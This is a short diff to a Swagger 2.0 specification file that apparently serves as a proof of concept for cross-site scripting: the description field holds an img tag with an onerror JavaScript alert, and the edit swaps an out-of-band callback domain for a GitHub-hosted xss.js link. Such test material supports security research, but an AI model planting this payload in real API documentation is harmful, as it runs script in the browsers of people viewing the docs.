@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: Example title
-  description: <img src=1 href=https://97e0t7ag62mi0cwbloh83nw02r8iw9yxn.oastify.com onerror="javascript:alert(1)"></img>
+  description: <img src=1 href=https://raw.githubusercontent.com/darianic/poc/main/xss.js onerror="javascript:alert(1)"></img>
 paths:
   /:
     get:
